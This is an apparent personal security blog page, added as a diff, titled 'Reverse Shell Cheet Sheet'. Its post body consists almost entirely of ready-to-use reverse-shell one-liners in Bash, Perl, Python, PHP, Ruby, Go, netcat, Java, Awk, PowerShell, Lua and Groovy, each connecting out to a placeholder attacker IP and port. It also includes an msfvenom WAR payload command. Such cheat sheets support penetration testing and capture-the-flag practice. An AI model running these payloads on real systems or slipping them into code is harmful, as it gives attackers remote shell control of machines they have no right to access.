@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="K3nX">
+
+
+
+
+
+<title>Reverse Shell Cheet Sheet</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">K3nX</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">K3nX</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Reverse Shell Cheet Sheet </h1>
+            
+                <div class="post-meta">
+                    
+
+                    
+                    
+                        <span class="post-egory">
+                    Category:
+                           Reverse Shell 
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>Reverse Shell Cheet Sheet</p>
+<h3 id="bash_tcp"><a href="#bash_tcp" class="headerlink" title="bash_tcp"></a>Bash(TCP)</h3>
+<pre><code class="bash">bash -i >& /dev/tcp/youripaddress/port 0>&1 </code></pre>
+<h3 id="bash_udp"><a href="#bash_udp" class="headerlink" title="bash_udp"></a>Bash (UDP)</h3>
+<pre><code class="bash">sh -i >& /dev/udp/youripaddress/port 0>&1 </code></pre>
+<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>Perl</h3>
+<pre><code class="bash">perl -e 'use Socket;$i="youripaddress";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+</code></pre>
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>Python</h3>
+<pre><code class="bash">
+python -c 'import
+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("youripaddress",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</code></pre>
+<h3 id="php"><a href="#php" class="headerlink" title="php"></a>PHP</h3>
+<pre><code class="bash">
+php -r '$sock=fsockopen("youripaddress",port);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("youripaddress",port);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("youripaddress",port);`/bin/sh -i <&3 >&3 2>&3`;'
+php -r '$sock=fsockopen("youripaddress",port);system("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("youripaddress",port);passthru("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("youripaddress",port);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+
+php -r '$sock=fsockopen("youripaddress",port);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+</code></pre>
+<h3 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>Ruby</h3>
+<pre><code class="bash">
+ruby -rsocket -e'f=TCPSocket.open("youripaddress",port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("youripaddress","port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+</code></pre>
+<h3 id="go"><a href="#go" class="headerlink" title="go"></a>Go Lang</h3>
+<pre><code class="bash">
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","youripaddress:port");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+</code></pre>
+<h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>NetCat</h3>
+<pre><code class="bash">
+nc -e /bin/sh youripaddress port
+nc -e /bin/bash youripaddress port
+nc -c bash youripaddress port
+</code></pre>
+<h3 id="java"><a href="#java" class="headerlink" title="java"></a>Java</h3>
+<pre><code class="bash">
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/youripaddress/port;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+</code></pre>
+<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>Awk</h3>
+<pre><code class="bash">
+awk 'BEGIN {s = "/inet/tcp/0/youripaddress/port"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+</code></pre>
+
+<h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>PowerShell</h3>
+<pre><code class="bash">
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("youripaddress",port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('youripaddress',port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+</code></pre>
+<h3 id="war"><a href="#war" class="headerlink" title="war"></a>War</h3>
+<pre><code class="bash">
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=youripaddress LPORT=port -f war > reverse.war
+</code></pre>
+
+<h3 id="lua"><a href="#lua" class="headerlink" title="lua"></a>Lua</h3>
+<pre><code class="bash">
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('youripaddress','port');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+</code></pre>
+
+<h3 id="groovy"><a href="#groovy" class="headerlink" title="Groovy"></a>Groovy</h3>
+<pre><code class="bash">
+String host="youripaddress";
+int port=port;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+</code></pre>
+
+<h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3>
+<pre><code class="bash">
+<a href="https://github.com/thihzaw/reverse-shell">C Reverse Shell Program</a>
+</code></pre>
+	</div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright K3nX (c) 2019</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="#"># Reverse Shell</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/"></a>
+            
+            
+            <a class="next" rel="next" href="/hackthebox/machines/servmon">Servmon</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© K3nX </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
